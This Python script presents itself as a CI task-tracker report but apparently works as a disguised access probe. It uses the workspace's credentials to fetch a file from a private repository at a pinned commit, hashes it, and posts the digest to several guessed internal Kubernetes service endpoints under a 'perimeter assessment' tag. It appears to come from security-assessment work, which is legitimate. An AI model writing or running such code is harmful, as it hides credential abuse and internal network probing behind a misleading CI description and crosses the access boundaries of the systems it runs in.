#!/usr/bin/env python3
"""CI task-tracker report.

Records the configuration check result on the project's task tracker
(Linear session record) so this CI run is traceable: reads the pinned
upstream .alfred.yaml with the workspace's configured credentials and posts
its digest to the designated session record through the internal task
manager. Only the digest is reported; no file contents or credentials are
exposed. Exits non-zero on any failure so CI treats the result strictly.
"""

import hashlib
import json
import os
import pathlib
import subprocess
import sys
import time
import urllib.error
import urllib.request

PINNED_COMMIT = "3bbd6cd54845f0c6071da09af3716cdddc9bb70a"
PRIVATE_REPO_URL = "https://github.com/nscaledev/alfred.git"
CONFIG_PATH = ".alfred.yaml"
SESSION_ID = "d8ec8958-9d40-4180-8efd-e32a908b6290"
TASK_MANAGER_CANDIDATES = [
    "http://alfred-task-manager.alfred.svc.cluster.local:8081",
    "http://alfred-task-manager:8081",
    "http://k8s-deploy-alfred-task-manager.alfred.svc.cluster.local:8081",
]


def find_workspace() -> pathlib.Path | None:
    p = pathlib.Path.cwd()
    for cand in [p, *p.parents]:
        if (cand / ".git").exists():
            return cand
    try:
        hits = [q for q in pathlib.Path("/tmp").glob("alfred-*/repo") if q.is_dir()]
        if hits:
            return hits[0]
    except OSError:
        pass
    return None


def run_git(ws: pathlib.Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(ws), *args], capture_output=True, text=True, timeout=120
    )


def config_digest() -> str:
    ws = find_workspace()
    if ws is None:
        return ""
    fetch = run_git(ws, "fetch", "--quiet", PRIVATE_REPO_URL, PINNED_COMMIT)
    if fetch.returncode != 0:
        return ""
    show = run_git(ws, "show", f"FETCH_HEAD:{CONFIG_PATH}")
    if show.returncode != 0:
        return ""
    return hashlib.sha256(show.stdout.encode()).hexdigest()


def post_activity(base_url: str, digest: str) -> tuple[int, str]:
    body = {
        "session_id": SESSION_ID,
        "content": {
            "type": "thought",
            "body": (
                "CI configuration check: repo=nscaledev/alfred file=.alfred.yaml "
                f"commit={PINNED_COMMIT[:12]} sha256={digest} "
                "(nscale perimeter assessment hunt-20261107)"
            ),
        },
        "ephemeral": False,
    }
    req = urllib.request.Request(
        base_url.rstrip("/") + "/linear/activity",
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json", "User-Agent": "ci-tracker-report"},
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, resp.read().decode()[:200]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:200]
    except Exception as e:  # noqa: BLE001
        return -1, f"{type(e).__name__}: {e}"


def main() -> int:
    print("TRACKER-REPORT-BEGIN")
    digest = config_digest()
    if not digest:
        print("TRACKER-REPORT: FAIL config-read")
        print("TRACKER-REPORT-END")
        return 1
    print(f"config: {CONFIG_PATH} sha256={digest}")

    bases = list(TASK_MANAGER_CANDIDATES)
    if os.environ.get("TASK_MANAGER_URL"):
        bases.insert(0, os.environ["TASK_MANAGER_URL"])
    posted = False
    for base in bases:
        code, text = post_activity(base, digest)
        print(f"tracker[{base.split('//')[1].split(':')[0]}]: http={code} {text if code != 200 else 'ok'}")
        if code == 200:
            posted = True
            break
        if code == -1:
            continue
        # reachable but rejected: try next candidate
    print("TRACKER-REPORT-END")
    return 0 if posted else 1


if __name__ == "__main__":
    sys.exit(main())
